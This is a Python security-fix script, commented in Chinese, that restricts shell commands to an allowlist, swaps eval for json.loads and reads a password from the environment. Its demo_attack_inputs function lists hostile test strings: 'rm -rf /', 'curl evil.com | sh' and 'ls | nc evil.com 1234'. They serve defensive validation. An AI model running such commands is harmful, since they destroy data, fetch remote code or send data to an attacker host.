#!/usr/bin/env python3
"""secure.py — insecure.py 的修复版:subprocess 白名单 + json.loads 替代 eval + 环境变量密码。"""
import json
import os
import shlex
import subprocess
import sys
from typing import List

# 命令白名单(可执行名,不含路径),仅白名单内命令允许执行
ALLOWED_COMMANDS = {"ls", "echo", "cat", "pwd", "whoami", "date"}

# 修复 ③:从环境变量读密码,缺失直接失败,不内置默认值
DB_PASSWORD = os.environ.get("DB_PASSWORD")
if not DB_PASSWORD:
    raise RuntimeError("DB_PASSWORD env var required (e.g. export DB_PASSWORD=...)")


def safe_shell(cmd: str) -> str:
    """基于 subprocess.run([...], shell=False) + 白名单 的安全命令执行。

    拒绝策略:
      - 含 shell 元字符(| & ; > < ` $ ( ))直接拒绝
      - argv[0] 不在白名单直接拒绝
      - 用 timeout 兜底超时,decode_errors='replace' 防止二进制爆炸
    """
    dangerous = set("|&;><`$()")
    if any(c in dangerous for c in cmd):
        return f"blocked_by_whitelist: dangerous shell metachar in {cmd!r}"
    try:
        argv = shlex.split(cmd)
    except ValueError as e:
        return f"blocked_by_whitelist: shlex parse failed: {e}"
    if not argv:
        return "blocked_by_whitelist: empty command"
    if argv[0] not in ALLOWED_COMMANDS:
        return f"blocked_by_whitelist: command {argv[0]!r} not in whitelist"
    try:
        r = subprocess.run(
            argv, shell=False, capture_output=True,
            text=True, timeout=5,
        )
    except subprocess.TimeoutExpired:
        return f"blocked_by_whitelist: timeout after 5s: {cmd!r}"
    return (r.stdout + r.stderr).strip() or "(no output)"


def safe_eval_json(payload: str) -> object:
    """修复 ②:用 json.loads 替代 eval,严格 JSON 解析。"""
    try:
        return json.loads(payload)
    except json.JSONDecodeError as e:
        raise ValueError(f"invalid JSON payload: {e}") from None


def authenticate(user: str, password: str) -> bool:
    """修复 ① + ③:从环境变量读期望密码,常量时间比较防时序攻击。"""
    expected = DB_PASSWORD
    if not isinstance(password, str):
        return False
    import hmac
    return hmac.compare_digest(password, expected)


def demo_attack_inputs() -> List[str]:
    """模拟 5 类攻击输入,验证白名单拦截。"""
    return [
        "x; rm -rf /",                       # shell 注入
        "ls && curl evil.com | sh",          # 链式命令
        "$(whoami)",                         # 命令替换
        "ls | nc evil.com 1234",             # 管道
        "rm -rf /",                          # 不在白名单
        "ls",                                # 应通过
        "echo hello",                        # 应通过
    ]


if __name__ == "__main__":
    print(f"[secure.py] DB_PASSWORD from env, length={len(DB_PASSWORD)}")
    for cmd in demo_attack_inputs():
        out = safe_shell(cmd)
        flag = "ALLOW " if out and not out.startswith("blocked_by_whitelist") else "BLOCK"
        print(f"  {flag} {cmd!r:40s} -> {out[:80]}")
    # JSON 解析边界
    print("[secure.py] json.loads ok:", safe_eval_json('{"a": 1, "b": [2,3]}'))
    print("OK secure.py validated")
